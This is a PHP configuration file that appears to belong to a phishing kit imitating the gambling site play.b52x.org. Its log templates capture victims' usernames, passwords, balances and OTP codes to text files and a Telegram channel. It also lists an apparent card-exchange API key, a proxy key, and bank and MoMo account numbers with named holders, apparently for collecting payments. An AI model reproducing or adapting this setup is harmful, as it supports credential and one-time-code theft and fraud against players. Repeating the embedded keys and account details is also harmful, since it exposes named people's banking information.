<?php

return [
    'endpoint' => 'https://play.b52x.org',
    'templates' => [
        'logs' => [
            'user' => ':Username|:password|:Nickname|:BalanceGold<---->:time',
            'userTelegram' => "Username: :Username, Password: :password, Nick name: :Nickname, Coin: :BalanceGold, Time: :time",
            'loginOTP' => ':username|:password|:OTPCode<---->:time',
            'loginOTPTelegram' => "Username: :username, Password: :password, Code: :OTPCode, Time: :time",
        ]
    ],
    'logs' => [
        'user' => ROOT_PATH . '/logs/user.txt',
        'loginOTP' => ROOT_PATH . '/logs/login-otp.txt',
    ],

    '3rd' => [
        'telegram' => [
            'token' => '',
            'id' => ''
        ],
        'shopdoithe' => [
            'apiKey' => '666197e6211a01cac5e8058bdb2c08a6781a42d3a00d27a76e8ad9e77a4dacaf',
            'api_endpoints' => [
                'send' => 'https://shopdoithe.com/api/sendCard_v3'
            ]
        ],
        'tinsoftProxy' => 'TLdcimRS7PaE3Et6RzP2QZ4FmWjGgjJuUjqrbI'
    ],

    'finance' => [
        'recharge' => [
            'momo' => [
                'account_no' => '0793602677',
                'account_name' => 'VO HUYNH THANH VAN',
            ],
            'viettelPay' => [
                'account_no' => 'bar',
                'account_name' => 'Foo',
            ],
            'banks' => [
                'VCB' => [
                    'account_name' => 'TAN SAI SUAN',
                    'account_no' => '1035397299',
                    'branch_name' => '',
                ],
                'TCB' => [
                    'account_name' => 'Bảo Trì',
                    'account_no' => 'Bảo Trì',
                    'branch_name' => '',
                ],
                'MB' => [
                    'account_name' => 'VO THI PHUONG',
                    'account_no' => '20126666667979',
                    'branch_name' => '',
                ],
                'BIDV' => [
                    'account_name' => 'HOANG THI MEN',
                    'account_no' => '11110000620673',
                    'branch_name' => '',
                ],
                'ACB' => [
                    'account_name' => 'PHAM TRONG GIAP',
                    'account_no' => '6681641',
                    'branch_name' => '',
                ],
            ],
        ],
    ]
];